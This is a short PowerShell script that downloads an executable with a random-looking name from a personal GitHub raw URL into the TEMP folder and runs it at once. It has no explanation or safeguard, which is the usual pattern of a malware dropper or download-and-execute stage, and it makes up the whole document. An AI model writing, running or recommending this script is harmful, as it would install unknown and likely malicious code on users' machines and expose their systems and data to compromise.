$url = "https://raw.githubusercontent.com/fasa3e/pidoryapidor1/refs/heads/main/x479xdoy1zzw27g5.exe"
$output = "$env:TEMP\program.exe"
Invoke-WebRequest -Uri $url -OutFile $output
Start-Process $output
